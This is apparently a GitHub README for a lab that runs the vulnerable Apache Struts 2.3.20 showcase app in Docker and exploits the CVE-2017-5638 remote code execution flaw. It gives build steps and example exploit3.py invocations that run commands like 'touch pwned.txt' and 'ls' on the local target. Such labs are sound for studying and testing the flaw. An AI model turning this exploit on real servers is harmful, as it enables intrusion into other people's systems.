# struts2-showcase
* [Struts Showcase Application source code](https://archive.apache.org/dist/struts/2.3.20/) packaged in version 2.3.20
* Exploits converted to Python3 from [immunio/apache-struts2-CVE-2017-5638](https://github.com/immunio/apache-struts2-CVE-2017-5638)

## Setup for Intellij
* Download IntelliJ community
* Import from VCS
* File > Project Structure > Project SDK > JDK 1.8 
    * Install JDK 8 if it does not exist
* View > Maven > Toggle 'Skip Tests' Mode & Run Maven Build

### Dockerfile Run & exploit
```
git clone https://github.com/samqbush/struts2-showcase.git && cd ./struts2-showcase
docker build -t struts2-showcase:latest ./
docker run --name struts2-showcase -d -p 8360:8080 struts2-showcase:latest
```
### Access to the [WebUI](http://localhost:8360/struts2-showcase/home)

### Exploit from outside the container on linux
```
apt update && apt install -y python3-pip
cd ./Exploits-CVE-2017-5638/
python3 ./exploit3.py 'touch pwned.txt'
python3 ./exploit3.py ls
```

### Example exploit on Windows:
```
python exploit3.py dir
```
